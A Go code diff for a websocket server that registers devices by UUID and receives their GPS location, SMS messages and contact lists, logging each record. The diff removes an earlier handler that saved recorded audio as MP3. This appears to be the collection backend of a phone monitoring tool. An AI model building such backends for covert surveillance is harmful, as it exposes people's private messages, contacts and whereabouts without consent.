@@ -2,12 +2,9 @@ package ws
 
 import (
 	"encoding/json"
-	"fmt"
 	"github.com/gorilla/websocket"
 	"log"
 	"net/http"
-	"os"
-	"os/exec"
 	"time"
 )
 
@@ -19,163 +16,181 @@ type Message struct {
 	Data json.RawMessage `json:"data"`
 }
 
-type LocationData struct {
+type Location struct {
 	Lat float64 `json:"latitude"`
 	Lon float64 `json:"longitude"`
 }
 
-type AudioData []int16
+type SMS struct {
+	ID      int64  `json:"id"`
+	Address string `json:"address"`
+	Body    string `json:"body"`
+	Date    int64  `json:"date"`
+	Type    int    `json:"type"`
+}
+
+type Contact struct {
+	ID      string `json:"id"`
+	Name    string `json:"name"`
+	Phone   string `json:"phone"`
+	Email   string `json:"email"`
+	Address string `json:"address"`
+	Company string `json:"company"`
+	Title   string `json:"title"`
+	Note    string `json:"note"`
+	IM      string `json:"im"`
+}
+
+func setupPingHandler(connection *websocket.Conn) {
+	connection.SetPingHandler(func(appData string) error {
+		clients.Lock()
+		defer clients.Unlock()
+
+		for _, client := range clients.m {
+			if client.Conn == connection {
+				client.LastSeen = time.Now().Format(time.RFC1123)
+				clients.m[client.UUID] = client
+				break
+			}
+		}
+
+		return connection.WriteControl(websocket.PongMessage, []byte(appData), time.Now().Add(time.Second))
+	})
+}
+
+func getClient(connection *websocket.Conn, uuid string) Client {
+	clients.Lock()
+
+	client, ok := clients.m[uuid]
+	if !ok {
+		client = Client{
+			Conn:      connection,
+			UUID:      uuid,
+			LastSeen:  time.Now().Format(time.RFC1123),
+			Connected: true,
+		}
+
+		clients.m[uuid] = client
+	} else {
+		client.Conn = connection
+		client.LastSeen = time.Now().Format(time.RFC1123)
+		clients.m[uuid] = client
+	}
+
+	clients.Unlock()
+
+	return client
+}
 
 func Handler(w http.ResponseWriter, r *http.Request) {
-	c, err := upgrader.Upgrade(w, r, nil)
+	connection, err := upgrader.Upgrade(w, r, nil)
 	if err != nil {
 		log.Print("Error during upgrade:", err)
 		return
 	}
 
+	setupPingHandler(connection)
+
 	for {
 		var msg Message
-		if err := c.ReadJSON(&msg); err != nil {
+		if err := connection.ReadJSON(&msg); err != nil {
 			log.Println("Error during read:", err)
 			break
 		}
 
 		uuid := msg.UUID
-
 		if uuid == "" {
 			log.Println("No UUID provided")
 			break
 		}
 
-		switch msg.Type {
-		case "connect":
-			handleConnect(c, uuid)
+		client := getClient(connection, uuid)
+
+		handleMessage(client, msg)
+	}
+
+	connection.Close()
+}
+
+func handleMessage(client Client, msg Message) {
+	switch msg.Type {
+
+	case "connect":
+		handleConnect(client)
+		break
+	case "disconnect":
+		handleDisconnect(client)
+		break
+	case "location":
+		var data Location
+		if err := json.Unmarshal(msg.Data, &data); err != nil {
+			log.Println("Error during unmarshal:", err)
 			break
-		case "disconnect":
-			handleDisconnect(c, uuid)
+		}
+		handleLocation(client, data)
+	case "sms":
+		var data []SMS
+		if err := json.Unmarshal(msg.Data, &data); err != nil {
+			log.Println("Error during unmarshal:", err)
 			break
-		case "location":
-			var data LocationData
-			if err := json.Unmarshal(msg.Data, &data); err != nil {
-				log.Println("Error during unmarshal:", err)
-				break
-			}
-
-			handleLocation(c, uuid, data)
-		case "audio":
-			var data AudioData
-			if err := json.Unmarshal(msg.Data, &data); err != nil {
-				log.Println("Error during unmarshal:", err)
-				break
-			}
-			handleAudio(c, uuid, data)
-		default:
-			log.Println("Unknown message type:", msg.Type)
 		}
-	}
-
-	c.Close()
-}
-
-func handleConnect(conn *websocket.Conn, uuid string) {
-	clients.Lock()
-	defer clients.Unlock()
-
-	if c, ok := clients.m[uuid]; ok {
-		c.Conn = conn
-		c.Connected = true
-		c.LastSeen = time.Now().Format(time.RFC1123)
-		clients.m[uuid] = c
-	} else {
-		clients.m[uuid] = Client{
-			Conn:      conn,
-			UUID:      uuid,
-			Connected: true,
-			LastSeen:  time.Now().Format(time.RFC1123),
+		handleSMS(client, data)
+	case "contacts":
+		var data []Contact
+		if err := json.Unmarshal(msg.Data, &data); err != nil {
+			log.Println("Error during unmarshal:", err)
+			break
 		}
+		handleContacts(client, data)
+	default:
+		log.Println("Unknown message type:", msg.Type)
 	}
-
-	log.Println("Client connected:", uuid)
 }
 
-func handleDisconnect(conn *websocket.Conn, uuid string) {
+func handleConnect(client Client) {
 	clients.Lock()
 	defer clients.Unlock()
 
-	if c, ok := clients.m[uuid]; ok {
-		c.Connected = false
-		c.LastSeen = time.Now().Format(time.RFC1123)
-		clients.m[uuid] = c
-		log.Println("Client disconnected:", uuid)
+	client.Connected = true
+	clients.m[client.UUID] = client
+
+	log.Println("Client connected:", client.UUID)
+}
+
+func handleDisconnect(client Client) {
+	clients.Lock()
+	defer clients.Unlock()
+
+	if _, ok := clients.m[client.UUID]; ok {
+		client.Connected = false
+		clients.m[client.UUID] = client
+		log.Println("Client disconnected:", client.UUID)
 	} else {
-		log.Println("Client not found:", uuid)
+		log.Println("Client not found:", client.UUID)
 	}
 }
 
-func handleLocation(conn *websocket.Conn, uuid string, data LocationData) {
+func handleLocation(client Client, data Location) {
 	clients.Lock()
 	defer clients.Unlock()
 
-	if c, ok := clients.m[uuid]; ok {
+	if c, ok := clients.m[client.UUID]; ok {
 		c.Location = data
-		c.LastSeen = time.Now().Format(time.RFC1123)
-		clients.m[uuid] = c
-		log.Println("Location updated:", uuid)
+		clients.m[client.UUID] = c
+		log.Println("Location updated:", client.UUID)
 	} else {
-		log.Println("Client not found:", uuid)
+		log.Println("Client not found:", client.UUID)
 	}
 }
 
-func handleAudio(conn *websocket.Conn, uuid string, data AudioData) {
-	// Data is already unmarshalled as AudioData []int16
-	log.Printf("Received audio data of length: %d\n", len(data))
-
-	// Convert the data to raw bytes
-	audioBytes := int16ToBytes(data)
-
-	// Save raw audio data as a file
-	rawFileName := fmt.Sprintf("%s_audio.raw", uuid)
-	if err := saveRawAudio(rawFileName, audioBytes); err != nil {
-		log.Println("Error saving raw audio:", err)
-		return
+func handleSMS(client Client, data []SMS) {
+	for _, sms := range data {
+		log.Println("SMS received:", sms)
 	}
-
-	// Convert raw audio to MP3 using FFmpeg
-	mp3FileName := fmt.Sprintf("%s_audio.mp3", uuid)
-	if err := convertToMP3(rawFileName, mp3FileName); err != nil {
-		log.Println("Error converting to MP3:", err)
-		return
-	}
-
-	log.Printf("Saved MP3 audio for UUID %s at %s\n", uuid, mp3FileName)
 }
 
-func int16ToBytes(data []int16) []byte {
-	byteData := make([]byte, len(data)*2)
-	for i, v := range data {
-		byteData[i*2] = byte(v)
-		byteData[i*2+1] = byte(v >> 8)
+func handleContacts(client Client, data []Contact) {
+	for _, contact := range data {
+		log.Println("Contact received:", contact)
 	}
-	return byteData
-}
-
-func saveRawAudio(fileName string, data []byte) error {
-	return os.WriteFile(fileName, data, 0644)
-}
-
-func convertToMP3(inputFile, outputFile string) error {
-	cmd := exec.Command("ffmpeg",
-		"-f", "s16le", // Raw audio format
-		"-ar", "48000", // Sample rate (adjust as needed)
-		"-ac", "1", // Number of channels (mono)
-		"-i", inputFile, // Input file
-		outputFile, // Output file
-	)
-
-	output, err := cmd.CombinedOutput()
-	if err != nil {
-		return fmt.Errorf("FFmpeg error: %s\nOutput: %s", err, string(output))
-	}
-
-	return nil
 }
